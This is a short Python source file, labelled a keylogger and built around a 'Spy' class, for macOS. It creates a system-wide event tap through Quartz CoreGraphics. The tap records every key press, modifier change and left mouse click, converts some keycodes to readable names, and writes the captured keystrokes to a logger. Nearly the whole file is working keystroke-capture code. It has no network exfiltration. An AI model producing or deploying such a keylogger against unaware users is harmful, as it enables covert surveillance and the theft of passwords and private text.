#!/usr/bin/env python3
"""
spy.py
keylogger

Spy class that creates an event tap to record keystrokes.

Created by Jakob Beckmann on 21/07/2017.
"""

from Foundation import *
from AppKit import *
from Quartz.CoreGraphics import *

class Spy:
    """
    Spy class defining the event tap for keystrokes and mouse button presses.
    """
    keycode_list = []
    convert_keycode = {
        0: "[LMB]",
        54: "[right-cmd]",
        55: "[left-cmd]",
        56: "[left-shift]",
        57: "[caps]",
        58: "[left-option]",
        59: "[left-ctrl]",
        60: "[right-shift]",
        61: "[right-option]",
        62: "[right-ctrl]"
    }

    def __init__(self):
        Spy.keycode_list = []


    def create_listener(self, logger):
        """
        Actually creates the tap. This is not performed in the initialisation as we wish to run the tap in a seperate thread.
        """
        self._event_mask = (CGEventMaskBit(kCGEventLeftMouseDown) |
                            CGEventMaskBit(kCGEventFlagsChanged) |
                            CGEventMaskBit(kCGEventKeyDown))
        self._event_tap = CGEventTapCreate(kCGHIDEventTap,
                                           kCGHeadInsertEventTap,
                                           kCGEventTapOptionDefault,
                                           self._event_mask,
                                           _callback_func,
                                           logger)

        self._runLoopSource = CFMachPortCreateRunLoopSource(
                            kCFAllocatorDefault, self._event_tap, 0)
        CFRunLoopAddSource(CFRunLoopGetCurrent(), self._runLoopSource,
                           kCFRunLoopCommonModes)
        CGEventTapEnable(self._event_tap, True)
        CFRunLoopRun()

    def print_and_clear(self, logger):
        """
        Clears and prints the currently stored keystrokes to logger.
        """
        if Spy.keycode_list:
            logger.write(" ".join(str(x) for x in Spy.keycode_list))
            Spy.keycode_list = []


def _callback_func(proxy, type_, event, logger):
    """
    Function called by the event tap. Stores keycode to internal variables.
    """
    keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode)
    try:
        keycode = Spy.convert_keycode[keycode]
    except KeyError:
        pass
    Spy.keycode_list.append(keycode)
    return event
